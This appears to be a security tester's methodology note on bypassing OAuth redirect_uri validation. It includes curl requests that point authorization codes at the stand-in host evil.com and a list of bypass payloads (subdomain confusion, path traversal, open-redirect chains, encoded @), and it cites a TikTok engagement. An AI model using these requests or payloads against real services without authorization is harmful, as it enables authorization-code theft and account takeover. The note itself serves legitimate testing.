# OAuth redirect_uri Testing Methodology

## Overview
Testing OAuth authorization endpoints for redirect_uri validation bypass. A successful bypass allows an attacker to steal authorization codes, leading to account takeover.

## Testing Flow

### Step 1: Identify OAuth Parameters
From JS bundles or page source, extract:
- `client_key` / `client_id`
- `redirect_uri` (legitimate callback)
- `response_type` (usually `code`)
- `scope`

### Step 2: Test Unauthenticated (Pre-Login)
```bash
# Legitimate redirect_uri
curl -sk -D - "https://target.com/oauth/authorize?client_id=XXX&response_type=code&scope=basic&redirect_uri=https://legitimate.com/callback" | grep -i location

# Evil redirect_uri
curl -sk -D - "https://target.com/oauth/authorize?client_id=XXX&response_type=code&scope=basic&redirect_uri=https://evil.com/callback" | grep -i location

# No redirect_uri (check if required)
curl -sk -D - "https://target.com/oauth/authorize?client_id=XXX&response_type=code&scope=basic" | grep -i "location\|error"
```

**Interpretation:**
- Both redirect to login → validation happens AFTER login (need auth testing)
- Evil rejected immediately → server validates upfront (harder to bypass)
- No redirect_uri gives error → parameter is required

### Step 3: Test Authenticated (Post-Login)
```bash
# With valid session cookies
curl -sk -D - "https://target.com/oauth/authorize?client_id=XXX&response_type=code&scope=basic&redirect_uri=https://evil.com/callback" \
  -H "Cookie: sessionid=XXX" | head -50
```

**Key distinction:**
- Returns consent page HTML (200) → consent page renders, but code delivery not yet confirmed
- Returns 302 to evil.com?code=XXX → **CONFIRMED VULN** (Critical)
- Returns error page → server validates at consent step

### Step 4: Confirm Code Delivery (CRITICAL)
**The consent page rendering is NOT proof of exploitation.** Many OAuth providers:
1. Render consent page without validating redirect_uri
2. Validate redirect_uri only when user clicks "Authorize" (server-side XHR)
3. The actual code issuance happens via JS AJAX call, not the page render

**To confirm:** Must click "Authorize" in browser and observe where the code lands.
- Use Burp browser to visit the OAuth URL with evil redirect_uri
- Click Authorize
- Watch Burp proxy history for the redirect with `?code=`
- If code goes to evil.com → Critical finding
- If error appears → Not exploitable (server validates at issuance)

### Step 5: Bypass Techniques (if direct evil.com fails)
```
# Subdomain confusion
redirect_uri=https://legitimate.com.evil.com/callback

# Path traversal
redirect_uri=https://legitimate.com/callback/../../../@evil.com

# Open redirect chain
redirect_uri=https://legitimate.com/callback?next=https://evil.com

# Fragment injection
redirect_uri=https://legitimate.com/callback#@evil.com

# URL encoding tricks
redirect_uri=https://legitimate.com%40evil.com/callback

# Localhost/IP
redirect_uri=http://127.0.0.1/callback
```

## Pitfall: Consent Page ≠ Exploitation
**Learned from TikTok engagement (May 2026):**
TikTok's `/v2/auth/authorize/` renders the "Authorize with TikTok" consent page for ANY redirect_uri (including evil.com) when authenticated. This looks like a Critical finding but the actual redirect_uri validation likely happens when the user clicks "Authorize" via the `authV2.js` client-side code making an XHR to a confirm endpoint.

**Rule:** Never report OAuth redirect_uri bypass based solely on consent page rendering. Must confirm the authorization code actually lands on the attacker's domain.

## Severity
- Code delivered to attacker domain → **Critical** (full account takeover)
- Consent page renders but code not delivered → **Not a vulnerability** (by design)
- redirect_uri accepted but requires user interaction + validation fails at confirm → **Not a vulnerability**
